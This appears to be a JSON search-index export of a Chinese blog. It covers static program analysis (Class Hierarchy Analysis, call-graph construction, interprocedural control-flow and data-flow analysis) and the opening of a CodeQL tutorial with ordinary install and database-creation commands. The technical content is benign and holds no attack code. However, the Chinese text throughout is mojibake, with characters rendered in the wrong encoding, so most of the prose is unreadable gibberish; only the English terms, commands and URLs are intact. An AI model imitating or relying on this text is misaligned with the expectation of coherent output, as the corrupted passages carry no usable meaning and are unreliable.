ç§è°ƒç”¨ä¸­æœ€ä¸ºå¤æ‚çš„ä¸€ç§ï¼Œé¦–å…ˆé‡ç‚¹è®¨è®ºå®ƒã€‚åœ¨åŠ¨æ€è¿è¡Œæ—¶ï¼ŒVirtual call åŸºäºä¸¤ç‚¹å†³å®šè°ƒç”¨å“ªä¸ªå…·ä½“æ–¹æ³•ï¼š virtual call è¿”å›å†…å®¹çš„æ¥æ”¶å¯¹è±¡æ˜¯è°ï¼šc è°ƒç”¨ç‚¹å¤„çš„æ–¹æ³•ç­¾åï¼šm Signature = class type + method name + descriptor Descriptor = return type + parameter types æœ¬æ–‡ä¸­çš„æ–¹æ³•ç­¾åå®šä¹‰å¦‚ä¸‹ï¼š å®šä¹‰ Dispatch(c,m) å‡½æ•°æ¥æè¿°å‡½æ•°é—´çš„åˆ†é…å…³ç³»ï¼šJava ä¸­ Dispatch æœºåˆ¶å†³å®šå…·ä½“è°ƒç”¨å“ªä¸ªæ–¹æ³•ï¼Œc æ˜¯ç±»åï¼Œm æ˜¯ä¸€ä¸ªæ–¹æ³•ã€‚å¦‚æœèƒ½åœ¨æœ¬ç±»ä¸­æ‰¾åˆ° name å’Œ descriptor ä¸€è‡´çš„æ–¹æ³•ï¼Œåˆ™è°ƒç”¨ c çš„æ–¹æ³•ï¼Œå¦åˆ™åˆ°çˆ¶ç±»ä¸­å¯»æ‰¾ã€‚ ä¸€ä¸ªç¤ºä¾‹ï¼šDispatch å…³æ³¨ Receiver Object å³ new B() å’Œæ–¹æ³•ç­¾åï¼šA.foo() ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:1:4","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2 Class Hierarchy Analysis (CHA) ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:2:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2.1 å®šä¹‰ éœ€è¦é¦–å…ˆè·å¾—æ•´ä¸ªç¨‹åºçš„ç±»ç»§æ‰¿å…³ç³»å›¾ é€šè¿‡æ¥æ”¶å˜é‡çš„å£°æ˜ç±»å‹æ¥è§£æ Virtual call æ¥æ”¶å˜é‡çš„ä¾‹å­ï¼šåœ¨ a.foo() ä¸­ï¼Œa å°±æ˜¯æ¥æ”¶å˜é‡ å‡è®¾ä¸€ä¸ªæ¥æ”¶å˜é‡èƒ½å¤ŸæŒ‡å‘ A æˆ– A çš„æ‰€æœ‰å­ç±» ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:2:1","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2.2 å…·ä½“è¿‡ç¨‹ ä¸‹é¢ä»‹ç»è§£æè°ƒç”¨çš„ç®—æ³•ã€‚å®šä¹‰ Reslove(cs) å‡½æ•°ä¸ºï¼šé€šè¿‡ CHA ç®—æ³•å¯»æ‰¾åˆ°æŸä¸ªç¨‹åºè°ƒç”¨ç‚¹å¯¹åº”çš„å¯èƒ½çš„ç›®æ ‡å‡½æ•°å®ä½“ã€‚ call site(cs) å°±æ˜¯è°ƒç”¨è¯­å¥ï¼Œm(method) å°±æ˜¯å¯¹åº”çš„å‡½æ•°ç­¾åã€‚ T é›†åˆä¸­ä¿å­˜æ‰¾åˆ°çš„ç»“æœ ä¸‰ä¸ª if åˆ†æ”¯åˆ†åˆ«å¯¹åº”ä¹‹å‰æåˆ°çš„ Java ä¸­çš„ä¸‰ç§ call ç±»å‹ Static call Special call Virtual call 2.2.1 static call é™æ€æ–¹æ³•è°ƒç”¨å‰å†™çš„æ˜¯ç±»åï¼Œè€Œéé™æ€æ–¹æ³•è°ƒç”¨å‰å†™çš„æ˜¯å˜é‡æˆ–æŒ‡é’ˆåã€‚é™æ€æ–¹æ³•è°ƒç”¨ä¸éœ€è¦ä¾èµ–å®ä¾‹ã€‚å› æ­¤é™æ€æ–¹æ³•è°ƒç”¨çš„åˆ†æç»“æœååˆ†ç®€å•ï¼Œå¾ˆæ˜æ˜¾è°ƒç”¨çš„å°±æ˜¯å½“å‰ç±»çš„æ–¹æ³•ï¼Œæ‰€ä»¥ç›´æ¥åŠ åˆ°é›†åˆ T ä¸­ã€‚ 2.2.2 special call special call ä¸»è¦åˆ†ä¸ºä¸‰ç§æƒ…å†µã€‚ä¸Šå›¾æ˜¯ç¬¬ä¸€ç§ä½¿ç”¨ super ç±»çš„è°ƒç”¨æ–¹æ³•ã€‚foo() è™½ç„¶åœ¨å½“å‰ç±»æœ‰å®šä¹‰ï¼Œä½†æ˜¯å®é™…ä½¿ç”¨çš„æ˜¯çˆ¶ç±»çš„ foo()ï¼Œå› æ­¤éœ€è¦ä½¿ç”¨ Dispatch å‡½æ•°ï¼Œå…¶ä¸­çš„ foo() çš„ç­¾å m ç”±ç¼–è¯‘å™¨è¿”å›ä¿¡æ¯å¯ä»¥çŸ¥é“æ˜¯ B çš„ï¼Œé‚£ä¹ˆè·å– foo() è¿”å›å€¼çš„ c ä¹ŸæŒ‡å‘ Bï¼Œä¹Ÿå°±ç›¸å½“äºåœ¨çˆ¶ç±»ä¸­å¯»æ‰¾äº†ã€‚ ä¸ºä»€ä¹ˆå¤„ç† super è°ƒç”¨éœ€è¦ä½¿ç”¨ Dispatch å‡½æ•°ï¼Ÿåœ¨ä¸‹å›¾æ‰€ç¤ºæƒ…å†µä¸­æ²¡æœ‰ Dispatch å‡½æ•°æ—¶æ— æ³•æ­£ç¡®è§£æ C ç±»çš„ super.foo è°ƒç”¨ï¼š è€Œ Private instance method å’Œ Constructorï¼ˆä¸€å®šç”±ç±»å®ç°æˆ–æœ‰é»˜è®¤çš„æ„é€ å‡½æ•°ï¼‰éƒ½ä¼šåœ¨æœ¬ç±»çš„å®ç°ä¸­ç»™å‡ºï¼Œä½¿ç”¨ Dispatch å‡½æ•°èƒ½å¤Ÿå°†è¿™ä¸‰ç§æƒ…å†µéƒ½åŒ…å«ï¼Œç®€åŒ–ä»£ç ã€‚ 2.2.3 virtual call æœ€åæ˜¯å¤„ç† virtual callï¼Œè¿™ä¹Ÿæ˜¯ CHA åŒºåˆ«äºå…¶ä»–ç®—æ³•çš„ä¸»è¦ä¹‹å¤„ã€‚è¯¥ç®—æ³•ä¼šå¯¹æ­¤æ–¹æ³•åšä¸€ä¸ª Dispatch(c,m) å¹¶å°† c çš„æ‰€æœ‰å­é›†ä»¥åŠå­é›†çš„å­é›†å…¨éƒ½åšä¸€æ¬¡ Dispatch(c', m)ã€‚ç›´è§‚æ¥çœ‹ï¼Œå¯ä»¥åˆ†ä¸ºä¸¤æ­¥ï¼Œç¬¬ä¸€æ­¥æ˜¯å¯¹æœ¬èº«åšä¸€æ¬¡ Dispatchï¼Œçœ‹çœ‹å½“å‰ç±»ä¸­æ˜¯å¦æœ‰ foo()ï¼Œæ²¡æœ‰çš„è¯å°±åˆ°çˆ¶ç±»ä¸­é€’å½’åœ°æ‰¾ï¼›ç¬¬äºŒæ­¥æ˜¯åœ¨å½“å‰ç±»åœ°æ‰€æœ‰å­é›†ä¸­æ‰¾åˆ°æ‰€æœ‰çš„ foo()ï¼Œç„¶åå°†è¿™äº› foo åŒç¬¬ä¸€æ­¥æ‰¾åˆ°çš„ foo å…¨éƒ½åŠ å…¥ T ä¸­ã€‚ ä¸€ä¸ªä¾‹å­ï¼š å¸¸ç”¨äº IDE ä¸­ï¼Œç»™ç”¨æˆ·æä¾›æç¤ºã€‚æ¯”å¦‚å†™ä¸€å°æ®µæµ‹è¯•ä»£ç ï¼Œçœ‹çœ‹ b.foo() å¯èƒ½ä¼šè°ƒç”¨å“ªäº›å‡½æ•°ç­¾åã€‚å¯ä»¥çœ‹å‡º CHA åˆ†æä¸­è®¤ä¸º b.foo() å¯èƒ½è°ƒç”¨ Aã€Cã€D ä¸­çš„ foo() æ–¹æ³•ã€‚ ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:2:2","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2.3 CHA çš„ç‰¹å¾ åªè€ƒè™‘ç±»ç»§æ‰¿ç»“æ„ï¼Œæ‰€ä»¥å¾ˆå¿« å› ä¸ºå¿½ç•¥äº†æ•°æ®æµå’Œæ§åˆ¶æµçš„ä¿¡æ¯ï¼Œæ‰€ä»¥ä¸å¤ªå‡†ç¡® ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:2:3","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"2.4 è°ƒç”¨å›¾æ„å»º åˆ†ä¸ºä¸‰æ­¥ï¼š ä»å…¥å£æ–¹æ³•è¿›å…¥ï¼Œä¸€èˆ¬æ˜¯ main æ–¹æ³• å¯¹äºæ¯ä¸ªå¯åˆ°è¾¾çš„æ–¹æ³• mï¼Œé€šè¿‡ CHA ç®—æ³•æ‰¾å‡ºç‚¹è°ƒç”¨çš„æ–¹æ³• m' çš„è°ƒç”¨ä½ç½® å¯¹äºæ¯ä¸ª m (ä»¥åŠæ–°åŠ å…¥çš„ m') éƒ½è¿›è¡Œç¬¬äºŒæ­¥ï¼ŒçŸ¥é“ä¸å†æœ‰æ–°çš„æ–¹æ³•è¢«å‘ç° æ„é€ è°ƒç”¨å›¾çš„ç®—æ³•å¦‚ä¸‹ï¼š Worklist è®°å½•éœ€è¦å¤„ç†çš„ methods Call graph æ˜¯éœ€è¦æ„å»ºçš„ç›®æ ‡ï¼Œæ˜¯ call edges çš„é›†åˆ Reachable method (RM) æ˜¯å·²ç»å¤„ç†è¿‡çš„ç›®æ ‡ï¼Œåœ¨ Worklist ä¸­å–æ–°ç›®æ ‡æ—¶ï¼Œä¸éœ€è¦å†æ¬¡å¤„ç†å·²ç»åœ¨ RM ä¸­çš„ç›®æ ‡ ä¸€ä¸ªä¾‹å­ï¼š ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:2:4","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"3 è¿‡ç¨‹é—´çš„æ§åˆ¶æµå›¾ï¼šInterprocedural Control-Flow Graph ICFG = CFGs + call \u0026 return edges è°ƒç”¨è¾¹ï¼šä»è°ƒç”¨ç‚¹ call site åˆ°è¢«è°ƒæ–¹æ³• callee çš„å…¥å£ è¿”å›è¾¹ï¼šä» callee çš„è¿”å›è¯­å¥åˆ° call site çš„ä¸‹ä¸€å¥ å›¾ç¤ºä¾¿æ˜¯è¿‡ç¨‹é—´çš„æ§åˆ¶æµå›¾ï¼ŒICFG æœ¬è´¨è¿˜æ˜¯ CFGï¼Œåº”è¯¥ç”¨ä¸‰åœ°å€ç æ„æˆçš„ Basic Block æ„æˆï¼Œä½†æ˜¯æ­¤å¤„ä¸ºäº†æ¸…æ™°åˆ†æï¼Œæ‰€ä»¥è¿˜æ˜¯å°† BB æ‹†å¼€æ¥åˆ†æã€‚ ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:3:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"4 è¿‡ç¨‹é—´æ•°æ®æµåˆ†æï¼šInterprocedural Data-Flow Analysis ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:4:0","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"4.1 å®šä¹‰ä¸æ¯”è¾ƒ è¿‡ç¨‹é—´åˆ†æå¤šäº†ä¸€ä¸ªè°ƒç”¨è¿”å›è¾¹åŠå¯¹åº”çš„ä¼ é€’å‡½æ•°ã€‚ Call edge transferï¼šä»è°ƒç”¨è€…å‘è¢«è°ƒç”¨è€…ä¼ é€’å‚æ•° Return edge transferï¼šè¢«è°ƒç”¨è€…å‘è°ƒç”¨è€…ä¼ é€’è¿”å›å€¼ Node transferï¼šä¸å‰é¢æ–‡ç« æåˆ°çš„ä¼ é€’å‡½æ•°åŸºæœ¬ä¸€æ ·ï¼Œä½†æ˜¯å¤šäº†ä¸€ä¸ªæ€§è´¨ï¼Œå¯¹äºæ¯æ¬¡è°ƒç”¨ (ä¾‹å¦‚ b=foo(a)) ä¼šå°†ç­‰å¼å·¦ä¾§çš„æ•°å€¼ kill æ‰ï¼Œç„¶ååœ¨ä¸‹ä¸€æ­¥ä¸­æœ‰è¿”å›è¾¹ä¼ é€’å‡½æ•°é‡æ–°èµ‹å€¼ã€‚è¿™ä¸ªæ“ä½œå¯ä»¥åœ¨è¿”å›å€¼ä¸åŸå€¼ä¸åŒæ—¶é˜²æ­¢æ•°æ®å†²çªã€‚ ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:4:1","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["é™æ€ç¨‹åºåˆ†æ"],"content":"4.2 ç¤ºä¾‹ è¿™ä¸€æ®µå­˜åœ¨çš„å¿…è¦æ€§ï¼Ÿ å¦‚æœæ²¡æœ‰è¿™ä¸€æ®µï¼Œé‚£ä¹ˆå˜é‡ a åœ¨åˆ†æè¢«è°ƒç”¨å‡½æ•°çš„å…¨ç¨‹ä¸­éƒ½éœ€è¦è®°ä½ a çš„å€¼ï¼Œè¿™åœ¨ç¨‹åºè¿è¡Œæ—¶ä¼šæµªè´¹å¤§é‡å†…å­˜ã€‚ æ­¤å¤–ï¼Œè¦è®°å¾—åœ¨è°ƒç”¨è¯­å¥å¤„ kill æ‰è¡¨è¾¾å¼å·¦è¾¹çš„å€¼ï¼Œå¦åˆ™ä¼šé€ æˆç»“æœçš„ä¸å‡†ç¡®ï¼š ","date":"2022-02-17","objectID":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/:4:2","tags":["é™æ€ç¨‹åºåˆ†æ"],"title":"é™æ€ç¨‹åºåˆ†æç³»åˆ—(äºŒ)","uri":"/2022/02/%E9%9D%99%E6%80%81%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90%E7%B3%BB%E5%88%97%E4%BA%8C/"},{"categories":["ä»£ç å®¡è®¡"],"content":"CodeQL åŸºç¡€","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"CodeQL åŸºç¡€ ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:0:0","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1 å‰è¨€ ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:1:0","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.1 èƒŒæ™¯ CodeQL æ˜¯ä¸€ä¸ªä»£ç åˆ†æå¹³å°ï¼Œåœ¨å®ƒçš„å¸®åŠ©ä¸‹ï¼Œå®‰å…¨ç ”ç©¶äººå‘˜å¯ä»¥åˆ©ç”¨å·²çŸ¥çš„å®‰å…¨æ¼æ´æ¥æŒ–æ˜ç±»ä¼¼çš„æ¼æ´ã€‚ CodeQL å°±æ˜¯ä¸€ç§ä»£ç åˆ†æå¹³å°ã€‚å€ŸåŠ©è¿™ä¸ªå¹³å°ï¼Œå®‰å…¨ç ”ç©¶äººå‘˜å¯ä»¥å®ç°å˜ç§åˆ†æçš„è‡ªåŠ¨åŒ–ã€‚è¿™é‡Œæ‰€è°“çš„å˜ç§åˆ†æï¼Œå°±æ˜¯ä»¥å·²çŸ¥çš„å®‰å…¨æ¼æ´ä½œä¸ºå‚ç…§ç‰©ï¼Œåœ¨æˆ‘ä»¬çš„ç›®æ ‡ä»£ç ä¸­å¯»æ‰¾ç±»ä¼¼çš„å®‰å…¨é—®é¢˜çš„è¿‡ç¨‹ï¼Œä¹Ÿå°±æ˜¯ç…§è‘«èŠ¦ç”»ç“¢çš„è¿‡ç¨‹ã€‚ æ­¤å¤–ï¼Œä¸ºäº†æé«˜å®‰å…¨åˆ†æäººå‘˜çš„å·¥ä½œæ•ˆç‡ï¼ŒCodeQL å¹³å°è¿˜æä¾›äº†è®¸å¤šæœ‰ç”¨çš„å·¥å…·ã€è„šæœ¬ã€æŸ¥è¯¢å’Œä»£ç åº“ã€‚ ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:1:1","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.2 ç›¸å…³æ¦‚å¿µ 1.2.1 CodeQL æ ¸å¿ƒ QL è¯­è¨€ åœ¨é™æ€ç¨‹åºåˆ†æå­¦ç§‘ä¸­ï¼Œé€šå¸¸é‡‡ç”¨ä¸€ç§ Data-Log çš„å£°æ˜å¼è¯­è¨€æ¥ä»£æ›¿å‘½ä»¤å¼è¯­è¨€è¿›è¡Œç»“æœåˆ†æï¼Œå…·ä½“å¯ä»¥å‚è€ƒã€Œé™æ€ç¨‹åºåˆ†æã€æ–‡ç« ã€‚è€Œ QL è¯­è¨€ä¾¿æ˜¯ Data-Log è¯­è¨€çš„ä¸€ç§ã€‚ QL æ•°æ®åº“ CodeQL æ•°æ®åº“ä¸­å­˜æ”¾çš„æ˜¯ä½¿ç”¨ CodeQL åˆ›å»ºå’Œåˆ†æçš„å…³ç³»æ•°æ®ã€‚ å¯ä»¥å°†å…¶çœ‹ä½œæ˜¯ç›®æ ‡ä»£ç çš„ä¸­é—´åˆ†æäº§ç‰©ã€‚ 1.2.2 CodeQL å·¥ä½œåŸç† CodeQL å·¥ä½œæµç¨‹ï¼š å°†ä»£ç åˆ›å»ºæˆæ•°æ®åº“ ç¼–å†™QLæŸ¥è¯¢ä»æ•°æ®åº“ä¸­æŸ¥è¯¢ä»£ç  è§£é‡ŠæŸ¥è¯¢ç»“æœ 1.2.2.1 æ•°æ®åº“åˆ›å»º ä½¿ç”¨è¯­è¨€ç›¸å…³çš„ extractor ä»ä»£ç ä¸­æå–æŠ½è±¡è¯­æ³•æ ‘(ast)ã€åç§°ç»‘å®šçš„è¯­ä¹‰å’Œç±»å‹ä¿¡æ¯ï¼ŒæŠŠæºä»£ç è½¬åŒ–æˆå•å…³ç³»è¡¨ç¤º(single relational representation)ï¼Œä»¥ CodeQL æ•°æ®åº“å­˜å‚¨ã€‚è€Œåœ¨ CodeQL ä¸­ï¼Œæ˜¯é€šè¿‡ä¸€ç§ CSV flow æ¨¡å‹æ¥ä½œä¸ºä¸­é—´ä»£ç çš„ã€‚ æ­¤å¤–ï¼Œæ¯ç§è¯­è¨€éƒ½æœ‰è‡ªå·±ç‹¬ç‰¹çš„æ•°æ®åº“æ¨¡å¼ï¼Œç”¨äºå®šä¹‰åˆ›å»ºæ•°æ®åº“çš„å…³ç³»ã€‚è¯¥å›¾ä¸ºæå–è¿‡ç¨‹ä¸­çš„åˆå§‹è¯æ±‡åˆ†æä¸ä½¿ç”¨ CodeQL çš„å®é™…å¤æ‚åˆ†ææä¾›äº†ç•Œé¢ã€‚ 1.2.2.2 æ‰§è¡ŒæŸ¥è¯¢ ä½¿ç”¨ CodeQL ä¸“é—¨è®¾è®¡çš„é¢å‘å¯¹è±¡è¯­è¨€ QL æ¥æŸ¥è¯¢æ­¤å‰åˆ›å»ºçš„æ•°æ®åº“ 1.2.2.3 ç»“æœåˆ†æ å°†æŸ¥è¯¢ç»“æœå¯¹åº”åˆ°æºä»£ç çš„ä¸Šä¸‹æ–‡ä¸­å»ï¼Œå³é€šè¿‡æŸ¥è¯¢ç»“æœçš„è§£é‡Šæ‰¾åˆ°æºç ä¸­æ‰€å¯¹åº”çš„æ½œåœ¨æ¼æ´ ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:1:2","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"1.3 CodeQL å®‰è£… é¦–å…ˆéœ€è¦ä¸‹è½½ CodeQL CLI äºŒè¿›åˆ¶æ–‡ä»¶å¹¶å®‰è£…ï¼ŒCLI äºŒè¿›åˆ¶æ–‡ä»¶æ”¯æŒä¸»æµçš„æ“ä½œç³»ç»Ÿï¼ŒåŒ…æ‹¬ Windowsã€MacOSã€Linuxï¼ˆä»¥åœ¨ MacOS ä¸Šå®‰è£…ä¸ºä¾‹ï¼ŒWindows ä¸ŠåŒç†ï¼‰ï¼š # ä¸‹è½½codeql.zip wget https://github.com/github/codeql-cli-binaries/releases/latest/download/codeql.zip # è§£å‹ unzip codeql.zip # å°†codeqlæ·»åŠ è‡³pathä¸­ echo \"export PATH=\\$PATH:/path/to/codeql\" \u003e\u003e ~/.zshrc source ~/.zshrc ç„¶åéœ€è¦ä¸‹è½½ç›¸å…³åº“æ–‡ä»¶ï¼šhttps://github.com/Semmle/qlã€‚åº“æ–‡ä»¶æ˜¯å¼€æºçš„ï¼Œåç»­è¦åšçš„æ˜¯æ ¹æ®è¿™äº›åº“æ–‡ä»¶æ¥ç¼–å†™ QL è„šæœ¬ã€‚ ä¹‹åï¼Œéœ€è¦åœ¨ VSCode ä¸Šå®‰è£…å¯¹åº”çš„æ‰©å±•ï¼Œåœ¨åº”ç”¨å•†åº—ä¸­æœç´¢ CodeQL å³å¯ã€‚å®‰è£…ä¹‹åï¼Œéœ€è¦åœ¨æ‰©å±•è®¾ç½®é‡Œé…ç½® CLI æ–‡ä»¶çš„ä½ç½®ã€‚ æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç§å¿«æ·é…ç½®çš„æ–¹å¼ï¼Œå³ï¼šstart workspace é¡¹ç›®ã€‚ ğŸ“¢ æ³¨æ„ï¼šè¯¥å·¥ä½œåŒºå†…å«äº† QL åº“ï¼Œå› æ­¤ä¸€å®šè¦ä½¿ç”¨é€’å½’æ–¹å¼æ¥ä¸‹æ‹‰å·¥ä½œåŒºä»£ç ã€‚é€’å½’æ–¹å¼ä¸‹æ‹‰è¯¥ä»“åº“åï¼Œä¸éœ€è¦å†ä¸‹è½½ https://github.com/Semmle/ql è¿™ä¸ªåº“äº†ã€‚ git clone --recursive git@github.com:github/vscode-codeql-starter.git åœ¨é…ç½®å¥½ç¯å¢ƒä¹‹åï¼Œå°±å¯ä»¥åˆ©ç”¨ CLI å·¥å…·æ¥åˆ›å»ºæ•°æ®åº“äº†ã€‚ä»¥ Java ä»£ç ä¸ºä¾‹ï¼Œä½¿ç”¨å¦‚ä¸‹å‘½ä»¤åˆ›å»ºï¼š codeql database create \u003cdatabase-folder\u003e --language=java --command=\"mvn clean install --file pom.xml\" æŠ€å·§ å¦‚æœçœç•¥--commandå‚æ•°ï¼Œåˆ™ codeQL ä¼šè‡ªåŠ¨æ£€æµ‹å¹¶ä½¿ç”¨è‡ªå·±çš„å·¥å…·æ¥æ„å»ºã€‚ä½†è¿˜æ˜¯å¼ºçƒˆæ¨èä½¿ç”¨è‡ªå·±è‡ªå®šä¹‰çš„å‚æ•°ï¼Œå°¤å…¶æ˜¯å¤§é¡¹ç›®æ—¶ã€‚ å»ºç«‹å¥½çš„æ•°æ®åº“ï¼Œå…¶ç›®å½•ç»“æ„ä¸ºï¼š - log/ # è¾“å‡ºçš„æ—¥å¿—ä¿¡æ¯ - db-java/ # ç¼–è¯‘çš„æ•°æ®åº“ - src.zip # ç¼–è¯‘æ‰€å¯¹åº”çš„ç›®æ ‡æºç  - codeql-database.yml # æ•°æ®åº“ç›¸å…³é…ç½® é™¤äº†åœ¨æœ¬åœ°æ„å»ºæ•°æ®åº“å¤–ï¼ŒCodeQL è¿˜æä¾›äº†åœ¨çº¿ç‰ˆæœ¬ï¼šLGTM.comã€‚ä¸€æ–¹é¢ï¼Œå¯ä»¥åœ¨å…¶ä¸Šé¢ç›´æ¥æœç´¢å¼€æºé¡¹ç›®ï¼Œä¸‹è½½æ•°æ®åº“ï¼›å¦ä¸€æ–¹é¢ï¼Œä¹Ÿå¯ä»¥ä¸Šä¼ ä»£ç ï¼Œåå°ä¼šè‡ªåŠ¨ç”Ÿæˆä»£ç æ•°æ®åº“ã€‚åŒæ—¶ï¼Œåœ¨é€‰å®šé¡¹ç›®åï¼Œä¹Ÿå¯ä»¥åœ¨çº¿æŸ¥è¯¢ï¼Œååˆ†æ–¹ä¾¿ã€‚ æœ€ååœ¨ VSCode ä¸­ï¼Œç‚¹å‡»ã€Œæ‰“å¼€å·¥ä½œåŒºã€æ¥æ‰“å¼€åˆšåˆšä¸‹æ‹‰çš„ vscode-codeql-starter å·¥ä½œåŒºï¼Œåœ¨ CodeQL æ’ä»¶é‡Œï¼Œæ‰“å¼€åˆšåˆšç”Ÿæˆçš„ databaseã€‚ ç„¶åç¼–å†™è‡ªå·±çš„ CodeQL è„šæœ¬ï¼Œå¹¶å°†è„šæœ¬ä¿å­˜è‡³ vscode-codeql-starter/codeql-custom-queries-java å¤„ï¼Œè¿™æ · import æ¨¡å—æ—¶å°±å¯ä»¥æ­£å¸¸å¼•ç”¨ã€‚å°†ç¼–å†™çš„ ql è„šæœ¬åœ¨ VSCode ä¸­æ‰“å¼€ï¼Œä¹‹åç‚¹å‡» CodeQL æ’ä»¶ä¸­çš„ Run Queryï¼Œå³å¯å¼€å§‹æŸ¥è¯¢ã€‚ ","date":"2022-02-15","objectID":"/2022/02/codeql%E5%9F%BA%E7%A1%80/:1:3","tags":["ä»£ç å®¡è®¡"],"title":"CodeQL åŸºç¡€","uri":"/2022/02/codeql%E5%9F%BA%E7%A1%80/"},{"categories":["ä»£ç å®¡è®¡"],"content":"2 QL è¯­æ³• 